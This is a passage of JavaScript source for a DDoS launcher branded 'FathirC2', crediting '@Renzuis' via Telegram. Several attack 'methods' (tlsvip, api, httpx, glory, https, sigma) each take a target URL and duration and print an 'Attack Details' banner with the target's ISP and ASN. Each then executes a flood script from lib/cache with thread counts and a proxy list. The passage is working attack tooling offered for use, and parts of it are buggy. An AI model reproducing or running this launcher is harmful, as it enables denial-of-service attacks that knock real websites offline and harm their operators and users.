⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;35m  \x1b[31m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀ \x1b[1;35m     Host   ;[\x1b[1m\x1b[37m ${target} \x1b[1;35m]
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m 443 \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m zx \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀  \x1b[1;31m    \x1b[31m\x1b[47mCREDITS\x1b[0m
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀    \x1b[1;96m  Owner  :[\x1b[1m\x1b[37m @Renzuis \x1b[1;35m] 
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀    \x1b[1;96m  Telegram:[\x1b[1m\x1b[37m https://t.me/RenzuisTresser \x1b[1;35m]
═══════════════════════════════════════════════════════════════════════════════⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀   
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/2`);
exec(`node ${metode} ${target} ${duration} 64 10 proxy.txt`)
sigma()
};
// [========================================] //
async function tlsvip(args) {
  if (args.length < 3) {
    console.log(`Example: .tlsvip <target> <port> <duration>
tlsvip https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
                                           \x1b[1;31m    \x1b[31m\x1b[47m- [powered by FathirC2] -\x1b[0m
                                          \x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;35m  \x1b[31m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀ \x1b[1;35m     Host   ;[\x1b[1m\x1b[37m ${target} \x1b[1;35m]
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m 443 \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m tlsvip \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀  \x1b[1;31m    \x1b[31m\x1b[47mCREDITS\x1b[0m
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀    \x1b[1;96m  Owner  :[\x1b[1m\x1b[37m @Renzuis \x1b[1;35m] 
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀    \x1b[1;96m  Telegram:[\x1b[1m\x1b[37m https://t.me/RenzuisTresser \x1b[1;35m]
═══════════════════════════════════════════════════════════════════════════════⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀   
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/3`);
exec(`node ${metode} ${target} ${duration} 100 10`)
sigma()
};
// [========================================] //
async function api(args) {
  if (args.length < 3) {
    console.log(`Example: .api <target> <port>  <duration>
api https://contoh.com 443 60`);
    sigma();
	return
  }
 const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`                                         
                                           \x1b[1;31m    \x1b[31m\x1b[47m- [powered by FathirC2] -\x1b[0m
                                          \x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;35m  \x1b[31m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀ \x1b[1;35m     Host   ;[\x1b[1m\x1b[37m ${target} \x1b[1;35m]
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m 443 \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m api \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀  \x1b[1;31m    \x1b[31m\x1b[47mCREDITS\x1b[0m
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀    \x1b[1;96m  Owner  :[\x1b[1m\x1b[37m @Renzuis \x1b[1;35m] 
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀    \x1b[1;96m  Telegram:[\x1b[1m\x1b[37m https://t.me/RenzuisTresser \x1b[1;35m]
═══════════════════════════════════════════════════════════════════════════════⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀   
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/1`);
exec(`node ${metode} ${target} ${duration}`)
sigma()
};
// [========================================] //
async function httpx(args) {
  if (args.length < 3) {
    console.log(`Example: .https <target> <port>  <duration>
httpx https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
                                           \x1b[1;31m    \x1b[31m\x1b[47m- [powered by FathirC2] -\x1b[0m
                                          \x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;35m  \x1b[31m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀ \x1b[1;35m     Host   ;[\x1b[1m\x1b[37m ${target} \x1b[1;35m]
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m 443 \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m httpx \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀  \x1b[1;31m    \x1b[31m\x1b[47mCREDITS\x1b[0m
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀    \x1b[1;96m  Owner  :[\x1b[1m\x1b[37m @Renzuis \x1b[1;35m] 
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀    \x1b[1;96m  Telegram:[\x1b[1m\x1b[37m https://t.me/RenzuisTresser \x1b[1;35m]
═══════════════════════════════════════════════════════════════════════════════⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀   
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/4`);
exec(`node ${metode} ${target} ${duration} 32 10 proxy.txt`)
sigma()
};
// [========================================] //
async function glory(args) {
  if (args.length < 3) {
    console.log(`Example: .glory <target> <port>  <duration>
glory https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
                                           \x1b[1;31m    \x1b[31m\x1b[47m- [powered by FathirC2] -\x1b[0m
                                          \x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;35m  \x1b[31m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀ \x1b[1;35m     Host   ;[\x1b[1m\x1b[37m ${target} \x1b[1;35m]
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m 443 \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m glory \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀  \x1b[1;31m    \x1b[31m\x1b[47mCREDITS\x1b[0m
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀    \x1b[1;96m  Owner  :[\x1b[1m\x1b[37m @Renzuis \x1b[1;35m] 
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀    \x1b[1;96m  Telegram:[\x1b[1m\x1b[37m https://t.me/RenzuisTresser \x1b[1;35m]
═══════════════════════════════════════════════════════════════════════════════⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀   
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/5`);
exec(`node ${metode} ${target} ${duration} 32 8 proxy.txt`)
sigma()
};
// [========================================] //
async function https(args) {
  if (args.length < 3) {
    console.log(`Example: .https <target> <port>  <duration>
https https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
                                           \x1b[1;31m    \x1b[31m\x1b[47m- [powered by FathirC2] -\x1b[0m
                                          \x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;35m  \x1b[31m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀ \x1b[1;35m     Host   ;[\x1b[1m\x1b[37m ${target} \x1b[1;35m]
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m 443 \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m https \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀  \x1b[1;34m    IP     :[\x1b[1m\x1b[37m ${result.query} \x1b[1;34m]
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀  \x1b[1;31m    \x1b[31m\x1b[47mCREDITS\x1b[0m
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀    \x1b[1;96m  Owner  :[\x1b[1m\x1b[37m @Renzuis \x1b[1;35m] 
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀    \x1b[1;96m  Telegram:[\x1b[1m\x1b[37m https://t.me/RenzuisTresser \x1b[1;35m]
═══════════════════════════════════════════════════════════════════════════════⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀   
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/6`);
exec(`node ${metode} ${target} ${duration} 9 3 proxy.txt`)
sigma()
};
// [========================================] //
async function sigma(args) {
  if (args.length < 3) {
    console.log(`Example: .sigma <target> <port>  <duration>
sigma https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
                                           \x1b[1;31m    \x1b[31m\x1b[47m- [powered by FathirC2] -\x1b[0m
                                          \x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;35m  \x1b[31m\x1b[47mAttack Details\x1b[0m
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀ \x1b[1;35m     Host   ;[\x1b[1m\x1b[37m ${target} \x1b[1;35m]
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄ \x1b[1;35m     Port   :[\x1b[1m\x1b[37m 443 \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀ \x1b[1;35m     Time   :[\x1b[1m\x1b[37m ${duration} \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀ \x1b[1;35m     Methods:[\x1b[1m\x1b[37m sigma \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀  \x1b[1;37m  \x1b[31m\x1b[47mTarget Details\x1b[0m
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀\x1b[1;34m      ASN    :[\x1b[1m\x1b[37m ${result.as} \x1b[1;34m]
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀ \x1b[1;34m     ISP    :[\x1b[1m\x1b[37m ${result.isp} \x1b[1;34m]
